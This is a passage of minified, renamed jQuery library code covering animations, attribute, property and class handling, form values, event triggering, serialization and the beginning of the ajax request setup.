                                                s = !0
                                            }
                                            u[E] = r && r[E] || bv.style(H, E)
                                        }
                                    }
                                    if (z = !bv.isEmptyObject(G), z || !bv.isEmptyObject(u)) {
                                        w && 1 === H.nodeType && (F.overflow = [t.overflow, t.overflowX, t.overflowY], y = r && r.display, null == y && (y = bZ.get(H, "display")), x = bv.css(H, "display"), "none" === x && (y ? x = y : (aL([H], !0), y = H.style.display || y, x = bv.css(H, "display"), aL([H]))), ("inline" === x || "inline-block" === x && null != y) && "none" === bv.css(H, "float") && (z || (v.done(function() {
                                            t.display = y
                                        }), null == y && (x = t.display, y = "none" === x ? "" : x)), t.display = "inline-block")), F.overflow && (t.overflow = "hidden", v.always(function() {
                                            t.overflow = F.overflow[0], t.overflowX = F.overflow[1], t.overflowY = F.overflow[2]
                                        })), z = !1;
                                        for (E in u) {
                                            z || (r ? "hidden" in r && (s = r.hidden) : r = bZ.access(H, "fxshow", {
                                                display: y
                                            }), C && (r.hidden = !s), s && aL([H], !0), v.done(function() {
                                                s || aL([H]), bZ.remove(H, "fxshow");
                                                for (E in u) {
                                                    bv.style(H, E, u[E])
                                                }
                                            })), z = a8(s ? r[E] : 0, E, v), E in r || (r[E] = z.start, s && (z.end = z.start, z.start = 0))
                                        }
                                    }
                                }

                                function aS(i, h) {
                                    var n, m, l, k, j;
                                    for (n in i) {
                                        if (m = bv.camelCase(n), l = h[m], k = i[n], bv.isArray(k) && (l = k[1], k = i[n] = k[0]), n !== m && (i[m] = k, delete i[n]), j = bv.cssHooks[m], j && "expand" in j) {
                                            k = j.expand(k), delete i[m];
                                            for (n in k) {
                                                n in i || (i[n] = k[n], h[n] = l)
                                            }
                                        } else {
                                            h[m] = l
                                        }
                                    }
                                }

                                function aK(v, u, t) {
                                    var s, r, q = 0,
                                        p = aK.prefilters.length,
                                        o = bv.Deferred().always(function() {
                                            delete n.elem
                                        }),
                                        n = function() {
                                            if (r) {
                                                return !1
                                            }
                                            for (var a = aY || bI(), w = Math.max(0, m.startTime + m.duration - a), k = w / m.duration || 0, j = 1 - k, h = 0, e = m.tweens.length; h < e; h++) {
                                                m.tweens[h].run(j)
                                            }
                                            return o.notifyWith(v, [m, j, w]), j < 1 && e ? w : (o.resolveWith(v, [m]), !1)
                                        },
                                        m = o.promise({
                                            elem: v,
                                            props: bv.extend({}, u),
                                            opts: bv.extend(!0, {
                                                specialEasing: {},
                                                easing: bv.easing._default
                                            }, t),
                                            originalProperties: u,
                                            originalOptions: t,
                                            startTime: aY || bI(),
                                            duration: t.duration,
                                            tweens: [],
                                            createTween: function(a, f) {
                                                var e = bv.Tween(v, m.opts, a, f, m.opts.specialEasing[a] || m.opts.easing);
                                                return m.tweens.push(e), e
                                            },
                                            stop: function(a) {
                                                var f = 0,
                                                    e = a ? m.tweens.length : 0;
                                                if (r) {
                                                    return this
                                                }
                                                for (r = !0; f < e; f++) {
                                                    m.tweens[f].run(1)
                                                }
                                                return a ? (o.notifyWith(v, [m, 1, 0]), o.resolveWith(v, [m, a])) : o.rejectWith(v, [m, a]), this
                                            }
                                        }),
                                        l = m.props;
                                    for (aS(l, m.opts.specialEasing); q < p; q++) {
                                        if (s = aK.prefilters[q].call(m, v, l, m.opts)) {
                                            return bv.isFunction(s.stop) && (bv._queueHooks(m.elem, m.opts.queue).stop = bv.proxy(s.stop, s)), s
                                        }
                                    }
                                    return bv.map(l, a8, m), bv.isFunction(m.opts.start) && m.opts.start.call(v, m), bv.fx.timer(bv.extend(n, {
                                        elem: v,
                                        anim: m,
                                        queue: m.opts.queue
                                    })), m.progress(m.opts.progress).done(m.opts.done, m.opts.complete).fail(m.opts.fail).always(m.opts.always)
                                }
                                bv.Animation = bv.extend(aK, {
                                        tweeners: {
                                            "*": [function(e, d) {
                                                var f = this.createTween(e, d);
                                                return a9(f.elem, e, cA.exec(d), f), f
                                            }]
                                        },
                                        tweener: function(g, f) {
                                            bv.isFunction(g) ? (f = g, g = ["*"]) : g = g.match(cd);
                                            for (var j, i = 0, h = g.length; i < h; i++) {
                                                j = g[i], aK.tweeners[j] = aK.tweeners[j] || [], aK.tweeners[j].unshift(f)
                                            }
                                        },
                                        prefilters: [a1],
                                        prefilter: function(d, c) {
                                            c ? aK.prefilters.unshift(d) : aK.prefilters.push(d)
                                        }
                                    }), bv.speed = function(f, d, h) {
                                        var g = f && "object" == typeof f ? bv.extend({}, f) : {
                                            complete: h || !h && d || bv.isFunction(f) && f,
                                            duration: f,
                                            easing: h && d || d && !bv.isFunction(d) && d
                                        };
                                        return bv.fx.off || bM.hidden ? g.duration = 0 : "number" != typeof g.duration && (g.duration in bv.fx.speeds ? g.duration = bv.fx.speeds[g.duration] : g.duration = bv.fx.speeds._default), null != g.queue && g.queue !== !0 || (g.queue = "fx"), g.old = g.complete, g.complete = function() {
                                            bv.isFunction(g.old) && g.old.call(this), g.queue && bv.dequeue(this, g.queue)
                                        }, g
                                    }, bv.fn.extend({
                                        fadeTo: function(f, e, h, g) {
                                            return this.filter(bK).css("opacity", 0).show().end().animate({
                                                opacity: e
                                            }, f, h, g)
                                        },
                                        animate: function(i, h, n, m) {
                                            var l = bv.isEmptyObject(i),
                                                k = bv.speed(h, n, m),
                                                j = function() {
                                                    var a = aK(this, bv.extend({}, i), k);
                                                    (l || bZ.get(this, "finish")) && a.stop(!0)
                                                };
                                            return j.finish = j, l || k.queue === !1 ? this.each(j) : this.queue(k.queue, j)
                                        },
                                        stop: function(f, e, h) {
                                            var g = function(d) {
                                                var c = d.stop;
                                                delete d.stop, c(h)
                                            };
                                            return "string" != typeof f && (h = e, e = f, f = void 0), e && f !== !1 && this.queue(f || "fx", []), this.each(function() {
                                                var a = !0,
                                                    i = null != f && f + "queueHooks",
                                                    d = bv.timers,
                                                    c = bZ.get(this);
                                                if (i) {
                                                    c[i] && c[i].stop && g(c[i])
                                                } else {
                                                    for (i in c) {
                                                        c[i] && c[i].stop && cz.test(i) && g(c[i])
                                                    }
                                                }
                                                for (i = d.length; i--;) {
                                                    d[i].elem !== this || null != f && d[i].queue !== f || (d[i].anim.stop(h), a = !1, d.splice(i, 1))
                                                }!a && h || bv.dequeue(this, f)
                                            })
                                        },
                                        finish: function(b) {
                                            return b !== !1 && (b = b || "fx"), this.each(function() {
                                                var a, l = bZ.get(this),
                                                    k = l[b + "queue"],
                                                    j = l[b + "queueHooks"],
                                                    i = bv.timers,
                                                    h = k ? k.length : 0;
                                                for (l.finish = !0, bv.queue(this, b, []), j && j.stop && j.stop.call(this, !0), a = i.length; a--;) {
                                                    i[a].elem === this && i[a].queue === b && (i[a].anim.stop(!0), i.splice(a, 1))
                                                }
                                                for (a = 0; a < h; a++) {
                                                    k[a] && k[a].finish && k[a].finish.call(this)
                                                }
                                                delete l.finish
                                            })
                                        }
                                    }), bv.each(["toggle", "show", "hide"], function(e, d) {
                                        var f = bv.fn[d];
                                        bv.fn[d] = function(b, g, c) {
                                            return null == b || "boolean" == typeof b ? f.apply(this, arguments) : this.animate(bh(d, !0), b, g, c)
                                        }
                                    }), bv.each({
                                        slideDown: bh("show"),
                                        slideUp: bh("hide"),
                                        slideToggle: bh("toggle"),
                                        fadeIn: {
                                            opacity: "show"
                                        },
                                        fadeOut: {
                                            opacity: "hide"
                                        },
                                        fadeToggle: {
                                            opacity: "toggle"
                                        }
                                    }, function(d, c) {
                                        bv.fn[d] = function(b, f, e) {
                                            return this.animate(c, b, f, e)
                                        }
                                    }), bv.timers = [], bv.fx.tick = function() {
                                        var e, d = 0,
                                            f = bv.timers;
                                        for (aY = bv.now(); d < f.length; d++) {
                                            e = f[d], e() || f[d] !== e || f.splice(d--, 1)
                                        }
                                        f.length || bv.fx.stop(), aY = void 0
                                    }, bv.fx.timer = function(b) {
                                        bv.timers.push(b), b() ? bv.fx.start() : bv.timers.pop()
                                    }, bv.fx.interval = 13, bv.fx.start = function() {
                                        cq || (cq = bP.requestAnimationFrame ? bP.requestAnimationFrame(ch) : bP.setInterval(bv.fx.tick, bv.fx.interval))
                                    }, bv.fx.stop = function() {
                                        bP.cancelAnimationFrame ? bP.cancelAnimationFrame(cq) : bP.clearInterval(cq), cq = null
                                    }, bv.fx.speeds = {
                                        slow: 600,
                                        fast: 200,
                                        _default: 400
                                    }, bv.fn.delay = function(a, d) {
                                        return a = bv.fx ? bv.fx.speeds[a] || a : a, d = d || "fx", this.queue(d, function(g, f) {
                                            var b = bP.setTimeout(g, a);
                                            f.stop = function() {
                                                bP.clearTimeout(b)
                                            }
                                        })
                                    },
                                    function() {
                                        var e = bM.createElement("input"),
                                            d = bM.createElement("select"),
                                            f = d.appendChild(bM.createElement("option"));
                                        e.type = "checkbox", bz.checkOn = "" !== e.value, bz.optSelected = f.selected, e = bM.createElement("input"), e.value = "t", e.type = "radio", bz.radioValue = "t" === e.value
                                    }();
                                var aC, au = bv.expr.attrHandle;
                                bv.fn.extend({
                                    attr: function(d, c) {
                                        return b2(this, bv.attr, d, c, arguments.length > 1)
                                    },
                                    removeAttr: function(b) {
                                        return this.each(function() {
                                            bv.removeAttr(this, b)
                                        })
                                    }
                                }), bv.extend({
                                    attr: function(h, g, l) {
                                        var k, j, i = h.nodeType;
                                        if (3 !== i && 8 !== i && 2 !== i) {
                                            return "undefined" == typeof h.getAttribute ? bv.prop(h, g, l) : (1 === i && bv.isXMLDoc(h) || (j = bv.attrHooks[g.toLowerCase()] || (bv.expr.match.bool.test(g) ? aC : void 0)), void 0 !== l ? null === l ? void bv.removeAttr(h, g) : j && "set" in j && void 0 !== (k = j.set(h, l, g)) ? k : (h.setAttribute(g, l + ""), l) : j && "get" in j && null !== (k = j.get(h, g)) ? k : (k = bv.find.attr(h, g), null == k ? void 0 : k))
                                        }
                                    },
                                    attrHooks: {
                                        type: {
                                            set: function(e, d) {
                                                if (!bz.radioValue && "radio" === d && bv.nodeName(e, "input")) {
                                                    var f = e.value;
                                                    return e.setAttribute("type", d), f && (e.value = f), d
                                                }
                                            }
                                        }
                                    },
                                    removeAttr: function(g, f) {
                                        var j, i = 0,
                                            h = f && f.match(cd);
                                        if (h && 1 === g.nodeType) {
                                            while (j = h[i++]) {
                                                g.removeAttribute(j)
                                            }
                                        }
                                    }
                                }), aC = {
                                    set: function(e, d, f) {
                                        return d === !1 ? bv.removeAttr(e, f) : e.setAttribute(f, f), f
                                    }
                                }, bv.each(bv.expr.match.bool.source.match(/\w+/g), function(e, d) {
                                    var f = au[d] || bv.find.attr;
                                    au[d] = function(h, c, l) {
                                        var k, j, i = c.toLowerCase();
                                        return l || (j = au[i], au[i] = k, k = null != f(h, c, l) ? i : null, au[i] = j), k
                                    }
                                });
                                var al = /^(?:input|select|textarea|button)$/i,
                                    ac = /^(?:a|area)$/i;
                                bv.fn.extend({
                                    prop: function(d, c) {
                                        return b2(this, bv.prop, d, c, arguments.length > 1)
                                    },
                                    removeProp: function(b) {
                                        return this.each(function() {
                                            delete this[bv.propFix[b] || b]
                                        })
                                    }
                                }), bv.extend({
                                    prop: function(h, g, l) {
                                        var k, j, i = h.nodeType;
                                        if (3 !== i && 8 !== i && 2 !== i) {
                                            return 1 === i && bv.isXMLDoc(h) || (g = bv.propFix[g] || g, j = bv.propHooks[g]), void 0 !== l ? j && "set" in j && void 0 !== (k = j.set(h, l, g)) ? k : h[g] = l : j && "get" in j && null !== (k = j.get(h, g)) ? k : h[g]
                                        }
                                    },
                                    propHooks: {
                                        tabIndex: {
                                            get: function(d) {
                                                var c = bv.find.attr(d, "tabindex");
                                                return c ? parseInt(c, 10) : al.test(d.nodeName) || ac.test(d.nodeName) && d.href ? 0 : -1
                                            }
                                        }
                                    },
                                    propFix: {
                                        "for": "htmlFor",
                                        "class": "className"
                                    }
                                }), bz.optSelected || (bv.propHooks.selected = {
                                    get: function(d) {
                                        var c = d.parentNode;
                                        return c && c.parentNode && c.parentNode.selectedIndex, null
                                    },
                                    set: function(d) {
                                        var c = d.parentNode;
                                        c && (c.selectedIndex, c.parentNode && c.parentNode.selectedIndex)
                                    }
                                }), bv.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
                                    bv.propFix[this.toLowerCase()] = this
                                });

                                function cE(d) {
                                    var c = d.match(cd) || [];
                                    return c.join(" ")
                                }

                                function ct(b) {
                                    return b.getAttribute && b.getAttribute("class") || ""
                                }
                                bv.fn.extend({
                                    addClass: function(r) {
                                        var q, p, o, n, m, l, k, j = 0;
                                        if (bv.isFunction(r)) {
                                            return this.each(function(a) {
                                                bv(this).addClass(r.call(this, a, ct(this)))
                                            })
                                        }
                                        if ("string" == typeof r && r) {
                                            q = r.match(cd) || [];
                                            while (p = this[j++]) {
                                                if (n = ct(p), o = 1 === p.nodeType && " " + cE(n) + " ") {
                                                    l = 0;
                                                    while (m = q[l++]) {
                                                        o.indexOf(" " + m + " ") < 0 && (o += m + " ")
                                                    }
                                                    k = cE(o), n !== k && p.setAttribute("class", k)
                                                }
                                            }
                                        }
                                        return this
                                    },
                                    removeClass: function(r) {
                                        var q, p, o, n, m, l, k, j = 0;
                                        if (bv.isFunction(r)) {
                                            return this.each(function(a) {
                                                bv(this).removeClass(r.call(this, a, ct(this)))
                                            })
                                        }
                                        if (!arguments.length) {
                                            return this.attr("class", "")
                                        }
                                        if ("string" == typeof r && r) {
                                            q = r.match(cd) || [];
                                            while (p = this[j++]) {
                                                if (n = ct(p), o = 1 === p.nodeType && " " + cE(n) + " ") {
                                                    l = 0;
                                                    while (m = q[l++]) {
                                                        while (o.indexOf(" " + m + " ") > -1) {
                                                            o = o.replace(" " + m + " ", " ")
                                                        }
                                                    }
                                                    k = cE(o), n !== k && p.setAttribute("class", k)
                                                }
                                            }
                                        }
                                        return this
                                    },
                                    toggleClass: function(e, d) {
                                        var f = typeof e;
                                        return "boolean" == typeof d && "string" === f ? d ? this.addClass(e) : this.removeClass(e) : bv.isFunction(e) ? this.each(function(a) {
                                            bv(this).toggleClass(e.call(this, a, ct(this), d), d)
                                        }) : this.each(function() {
                                            var a, h, g, c;
                                            if ("string" === f) {
                                                h = 0, g = bv(this), c = e.match(cd) || [];
                                                while (a = c[h++]) {
                                                    g.hasClass(a) ? g.removeClass(a) : g.addClass(a)
                                                }
                                            } else {
                                                void 0 !== e && "boolean" !== f || (a = ct(this), a && bZ.set(this, "__className__", a), this.setAttribute && this.setAttribute("class", a || e === !1 ? "" : bZ.get(this, "__className__") || ""))
                                            }
                                        })
                                    },
                                    hasClass: function(f) {
                                        var e, h, g = 0;
                                        e = " " + f + " ";
                                        while (h = this[g++]) {
                                            if (1 === h.nodeType && (" " + cE(ct(h)) + " ").indexOf(e) > -1) {
                                                return !0
                                            }
                                        }
                                        return !1
                                    }
                                });
                                var bT = /\r/g;
                                bv.fn.extend({
                                    val: function(g) {
                                        var f, j, i, h = this[0];
                                        if (arguments.length) {
                                            return i = bv.isFunction(g), this.each(function(b) {
                                                var a;
                                                1 === this.nodeType && (a = i ? g.call(this, b, bv(this).val()) : g, null == a ? a = "" : "number" == typeof a ? a += "" : bv.isArray(a) && (a = bv.map(a, function(c) {
                                                    return null == c ? "" : c + ""
                                                })), f = bv.valHooks[this.type] || bv.valHooks[this.nodeName.toLowerCase()], f && "set" in f && void 0 !== f.set(this, a, "value") || (this.value = a))
                                            })
                                        }
                                        if (h) {
                                            return f = bv.valHooks[h.type] || bv.valHooks[h.nodeName.toLowerCase()], f && "get" in f && void 0 !== (j = f.get(h, "value")) ? j : (j = h.value, "string" == typeof j ? j.replace(bT, "") : null == j ? "" : j)
                                        }
                                    }
                                }), bv.extend({
                                    valHooks: {
                                        option: {
                                            get: function(d) {
                                                var c = bv.find.attr(d, "value");
                                                return null != c ? c : cE(bv.text(d))
                                            }
                                        },
                                        select: {
                                            get: function(r) {
                                                var q, p, o, n = r.options,
                                                    m = r.selectedIndex,
                                                    l = "select-one" === r.type,
                                                    k = l ? null : [],
                                                    j = l ? m + 1 : n.length;
                                                for (o = m < 0 ? j : l ? m : 0; o < j; o++) {
                                                    if (p = n[o], (p.selected || o === m) && !p.disabled && (!p.parentNode.disabled || !bv.nodeName(p.parentNode, "optgroup"))) {
                                                        if (q = bv(p).val(), l) {
                                                            return q
                                                        }
                                                        k.push(q)
                                                    }
                                                }
                                                return k
                                            },
                                            set: function(i, h) {
                                                var n, m, l = i.options,
                                                    k = bv.makeArray(h),
                                                    j = l.length;
                                                while (j--) {
                                                    m = l[j], (m.selected = bv.inArray(bv.valHooks.option.get(m), k) > -1) && (n = !0)
                                                }
                                                return n || (i.selectedIndex = -1), k
                                            }
                                        }
                                    }
                                }), bv.each(["radio", "checkbox"], function() {
                                    bv.valHooks[this] = {
                                        set: function(d, c) {
                                            if (bv.isArray(c)) {
                                                return d.checked = bv.inArray(bv(d).val(), c) > -1
                                            }
                                        }
                                    }, bz.checkOn || (bv.valHooks[this].get = function(b) {
                                        return null === b.getAttribute("value") ? "on" : b.value
                                    })
                                });
                                var bl = /^(?:focusinfocus|focusoutblur)$/;
                                bv.extend(bv.event, {
                                    trigger: function(B, A, z, y) {
                                        var x, w, v, u, t, s, r, l = [z || bM],
                                            d = bC.call(B, "type") ? B.type : B,
                                            a = bC.call(B, "namespace") ? B.namespace.split(".") : [];
                                        if (w = v = z = z || bM, 3 !== z.nodeType && 8 !== z.nodeType && !bl.test(d + bv.event.triggered) && (d.indexOf(".") > -1 && (a = d.split("."), d = a.shift(), a.sort()), t = d.indexOf(":") < 0 && "on" + d, B = B[bv.expando] ? B : new bv.Event(d, "object" == typeof B && B), B.isTrigger = y ? 2 : 3, B.namespace = a.join("."), B.rnamespace = B.namespace ? new RegExp("(^|\\.)" + a.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, B.result = void 0, B.target || (B.target = z), A = null == A ? [B] : bv.makeArray(A, [B]), r = bv.event.special[d] || {}, y || !r.trigger || r.trigger.apply(z, A) !== !1)) {
                                            if (!y && !r.noBubble && !bv.isWindow(z)) {
                                                for (u = r.delegateType || d, bl.test(u + d) || (w = w.parentNode); w; w = w.parentNode) {
                                                    l.push(w), v = w
                                                }
                                                v === (z.ownerDocument || bM) && l.push(v.defaultView || v.parentWindow || bP)
                                            }
                                            x = 0;
                                            while ((w = l[x++]) && !B.isPropagationStopped()) {
                                                B.type = x > 1 ? u : r.bindType || d, s = (bZ.get(w, "events") || {})[B.type] && bZ.get(w, "handle"), s && s.apply(w, A), s = t && w[t], s && s.apply && b1(w) && (B.result = s.apply(w, A), B.result === !1 && B.preventDefault())
                                            }
                                            return B.type = d, y || B.isDefaultPrevented() || r._default && r._default.apply(l.pop(), A) !== !1 || !b1(z) || t && bv.isFunction(z[d]) && !bv.isWindow(z) && (v = z[t], v && (z[t] = null), bv.event.triggered = d, z[d](), bv.event.triggered = void 0, v && (z[t] = v)), B.result
                                        }
                                    },
                                    simulate: function(f, e, h) {
                                        var g = bv.extend(new bv.Event, h, {
                                            type: f,
                                            isSimulated: !0
                                        });
                                        bv.event.trigger(g, null, e)
                                    }
                                }), bv.fn.extend({
                                    trigger: function(d, c) {
                                        return this.each(function() {
                                            bv.event.trigger(d, c, this)
                                        })
                                    },
                                    triggerHandler: function(e, d) {
                                        var f = this[0];
                                        if (f) {
                                            return bv.event.trigger(e, d, f, !0)
                                        }
                                    }
                                }), bv.each("blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu".split(" "), function(d, c) {
                                    bv.fn[c] = function(b, e) {
                                        return arguments.length > 0 ? this.on(c, null, b, e) : this.trigger(c)
                                    }
                                }), bv.fn.extend({
                                    hover: function(d, c) {
                                        return this.mouseenter(d).mouseleave(c || d)
                                    }
                                }), bz.focusin = "onfocusin" in bP, bz.focusin || bv.each({
                                    focus: "focusin",
                                    blur: "focusout"
                                }, function(e, d) {
                                    var f = function(b) {
                                        bv.event.simulate(d, b.target, bv.event.fix(b))
                                    };
                                    bv.event.special[d] = {
                                        setup: function() {
                                            var b = this.ownerDocument || this,
                                                a = bZ.access(b, d);
                                            a || b.addEventListener(e, f, !0), bZ.access(b, d, (a || 0) + 1)
                                        },
                                        teardown: function() {
                                            var b = this.ownerDocument || this,
                                                a = bZ.access(b, d) - 1;
                                            a ? bZ.access(b, d, a) : (b.removeEventListener(e, f, !0), bZ.remove(b, d))
                                        }
                                    }
                                });
                                var be = bP.location,
                                    a5 = bv.now(),
                                    aW = /\?/;
                                bv.parseXML = function(a) {
                                    var f;
                                    if (!a || "string" != typeof a) {
                                        return null
                                    }
                                    try {
                                        f = (new bP.DOMParser).parseFromString(a, "text/xml")
                                    } catch (e) {
                                        f = void 0
                                    }
                                    return f && !f.getElementsByTagName("parsererror").length || bv.error("Invalid XML: " + a), f
                                };
                                var aO = /\[\]$/,
                                    aG = /\r?\n/g,
                                    ay = /^(?:submit|button|image|reset|file)$/i,
                                    ap = /^(?:input|select|textarea|keygen)/i;

                                function ag(g, f, j, i) {
                                    var h;
                                    if (bv.isArray(f)) {
                                        bv.each(f, function(a, c) {
                                            j || aO.test(g) ? i(g, c) : ag(g + "[" + ("object" == typeof c && null != c ? a : "") + "]", c, j, i)
                                        })
                                    } else {
                                        if (j || "object" !== bv.type(f)) {
                                            i(g, f)
                                        } else {
                                            for (h in f) {
                                                ag(g + "[" + h + "]", f[h], j, i)
                                            }
                                        }
                                    }
                                }
                                bv.param = function(g, f) {
                                    var j, i = [],
                                        h = function(e, d) {
                                            var k = bv.isFunction(d) ? d() : d;
                                            i[i.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == k ? "" : k)
                                        };
                                    if (bv.isArray(g) || g.jquery && !bv.isPlainObject(g)) {
                                        bv.each(g, function() {
                                            h(this.name, this.value)
                                        })
                                    } else {
                                        for (j in g) {
                                            ag(j, g[j], f, h)
                                        }
                                    }
                                    return i.join("&")
                                }, bv.fn.extend({
                                    serialize: function() {
                                        return bv.param(this.serializeArray())
                                    },
                                    serializeArray: function() {
                                        return this.map(function() {
                                            var b = bv.prop(this, "elements");
                                            return b ? bv.makeArray(b) : this
                                        }).filter(function() {
                                            var b = this.type;
                                            return this.name && !bv(this).is(":disabled") && ap.test(this.nodeName) && !ay.test(b) && (this.checked || !aD.test(b))
                                        }).map(function(e, d) {
                                            var f = bv(this).val();
                                            return null == f ? null : bv.isArray(f) ? bv.map(f, function(b) {
                                                return {
                                                    name: d.name,
                                                    value: b.replace(aG, "\r\n")
                                                }
                                            }) : {
                                                name: d.name,
                                                value: f.replace(aG, "\r\n")
                                            }
                                        }).get()
                                    }
                                });
                                var cI = /%20/g,
                                    cx = /#.*$/,
                                    aZ = /([?&])_=[^&]*/,
                                    aQ = /^(.*?):[ \t]*([^\r\n]*)$/gm,
                                    aI = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
                                    aA = /^(?:GET|HEAD)$/,
                                    ar = /^\/\//,
                                    aj = {},
                                    cK = {},
                                    cC = "*/".concat("*"),
                                    cr = bM.createElement("a");
                                cr.href = be.href;

                                function bR(b) {
                                    return function(a, j) {
                                        "string" != typeof a && (j = a, a = "*");
                                        var i, h = 0,
                                            g = a.toLowerCase().match(cd) || [];
                                        if (bv.isFunction(j)) {
                                            while (i = g[h++]) {
                                                "+" === i[0] ? (i = i.slice(1) || "*", (b[i] = b[i] || []).unshift(j)) : (b[i] = b[i] || []).push(j)
                                            }
                                        }
                                    }
                                }

                                function bj(i, h, n, m) {
                                    var l = {},
                                        k = i === cK;

                                    function j(b) {
                                        var a;
                                        return l[b] = !0, bv.each(i[b] || [], function(c, e) {
                                            var d = e(h, n, m);
                                            return "string" != typeof d || k || l[d] ? k ? !(a = d) : void 0 : (h.dataTypes.unshift(d), j(d), !1)
                                        }), a
                                    }
                                    return j(h.dataTypes[0]) || !l["*"] && j("*")
                                }

                                function bc(g, f) {
                                    var j, i, h = bv.ajaxSettings.flatOptions || {};
                                    for (j in f) {
                                        void 0 !== f[j] && ((h[j] ? g : i || (i = {}))[j] = f[j])
                                    }
                                    return i && bv.extend(!0, g, i), g
                                }

                                function a3(r, q, p) {
                                    var o, n, m, l, k = r.contents,
                                        j = r.dataTypes;
                                    while ("*" === j[0]) {
                                        j.shift(), void 0 === o && (o = r.mimeType || q.getResponseHeader("Content-Type"))
                                    }
                                    if (o) {
                                        for (n in k) {
                                            if (k[n] && k[n].test(o)) {
                                                j.unshift(n);
                                                break
                                            }
                                        }
                                    }
                                    if (j[0] in p) {
                                        m = j[0]
                                    } else {
                                        for (n in p) {
                                            if (!j[0] || r.converters[n + " " + j[0]]) {
                                                m = n;
                                                break
                                            }
                                            l || (l = n)
                                        }
                                        m = m || l
                                    }
                                    if (m) {
                                        return m !== j[0] && j.unshift(m), p[m]
                                    }
                                }

                                function aU(x, w, v, u) {
                                    var t, s, r, q, p, o = {},
                                        n = x.dataTypes.slice();
                                    if (n[1]) {
                                        for (r in x.converters) {
                                            o[r.toLowerCase()] = x.converters[r]
                                        }
                                    }
                                    s = n.shift();
                                    while (s) {
                                        if (x.responseFields[s] && (v[x.responseFields[s]] = w), !p && u && x.dataFilter && (w = x.dataFilter(w, x.dataType)), p = s, s = n.shift()) {
                                            if ("*" === s) {
                                                s = p
                                            } else {
                                                if ("*" !== p && p !== s) {
                                                    if (r = o[p + " " + s] || o["* " + s], !r) {
                                                        for (t in o) {
                                                            if (q = t.split(" "), q[1] === s && (r = o[p + " " + q[0]] || o["* " + q[0]])) {
                                                                r === !0 ? r = o[t] : o[t] !== !0 && (s = q[0], n.unshift(q[1]));
                                                                break
                                                            }
                                                        }
                                                    }
                                                    if (r !== !0) {
                                                        if (r && x["throws"]) {
                                                            w = r(w)
                                                        } else {
                                                            try {
                                                                w = r(w)
                                                            } catch (m) {
                                                                return {
                                                                    state: "parsererror",
                                                                    error: r ? m : "No conversion from " + p + " to " + s
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    return {
                                        state: "success",
                                        data: w
                                    }
                                }
                                bv.extend({
                                    active: 0,
                                    lastModified: {},
                                    etag: {},
                                    ajaxSettings: {
                                        url: be.href,
                                        type: "GET",
                                        isLocal: aI.test(be.protocol),
                                        global: !0,
                                        processData: !0,
                                        async: !0,
                                        contentType: "application/x-www-form-urlencoded; charset=UTF-8",
                                        accepts: {
                                            "*": cC,
                                            text: "text/plain",
                                            html: "text/html",
                                            xml: "application/xml, text/xml",
                                            json: "application/json, text/javascript"
                                        },
                                        contents: {
                                            xml: /\bxml\b/,
                                            html: /\bhtml/,
                                            json: /\bjson\b/
                                        },
                                        responseFields: {
                                            xml: "responseXML",
                                            text: "responseText",
                                            json: "responseJSON"
                                        },
                                        converters: {
                                            "* text": String,
                                            "text html": !0,
                                            "text json": JSON.parse,
                                            "text xml": bv.parseXML
                                        },
                                        flatOptions: {
                                            url: !0,
                                            context: !0
                                        }
                                    },
                                    ajaxSetup: function(d, c) {
                                        return c ? bc(bc(d, bv.ajaxSettings), c) : bc(bv.ajaxSettings, d)
                                    },
                                    ajaxPrefilter: bR(aj),
                                    ajaxTransport: bR(cK),
                                    ajax: function(V, U) {
                                        "object" == typeof V && (U = V, V = void 0), U = U || {};
                                        var T, S, R, Q, P, O, N, M, L, K, J = bv.ajaxSetup({}, U),
                                            I = J.context || J,
                                            G = J.context && (I.nodeType || I.jquery) ? bv(I) : bv.event,
                                            F = bv.Deferred(),
                                            E = bv.Callbacks("once memory"),
                                            D = J.statusCode || {},
                                            C = {},
                                            B = {},
                                            r = "canceled",
                                            d = {
                                                readyState: 0,
                                                getResponseHeader: function(e) {
                                                    var c;
                                                    if (N) {
                                                        if (!Q) {
                                                            Q = {};
                                                            while (c = aQ.exec(R)) {
                                                                Q[c[1].toLowerCase()] = c[2]
                                                            }
                                                        }
                                                        c = Q[e.toLowerCase()]
                                                    }
                                                    return null == c ? null : c
                                                },
                                                getAllResponseHeaders: function() {
                                                    return N ? R : null
                                                },
                                                setRequestHeader: function(e, c) {
                                                    return null == N && (e = B[e.toLowerCase()] = B[e.toLowerCase()] || e, C[e] = c), this
                                                },
                                                overrideMimeType: function(b) {
                                                    return null == N && (J.mimeType = b), this
                                                },
                                                statusCode: function(e) {
                                                    var c;
                                                    if (e) {
                                                        if (N) {
                                                            d.always(e[d.status])
                                                        } else {
                                                            for (c in e) {
                                                                D[c] = [D[c], e[c]]
                                                            }
                                                        }
                                                    }
                                                    return this
                                                },
                                                abort: function(e) {
                                                    var c = e || r;
                                                    return T && T.abort(c), H(0, c), this
                                                }
                                            };
                                        if (F.promise(d), J.url = ((V || J.url || be.href) + "").replace(ar, be.protocol + "//"), J.type = U.method || U.type || J.method || J.type, J.dataTypes = (J.dataType || "*").toLowerCase().match(cd) || [""], null == J.crossDomain) {
                                            O = bM.createElement("a");
                                            try {
                                                O.href = J.url, O.href = O.href, J.crossDomain = cr.protocol + "//" + cr.host != O.protocol + "//" + O.host
                                            } catch (a) {
                                                J.crossDomain = !0
                                            }
                                        }
                                        if (J.data && J.processData && "string" != typeof J.data && (J.data = bv.param(J.data, J.traditional)), bj(aj, J, U, d), N) {
                                            return d
                                        }
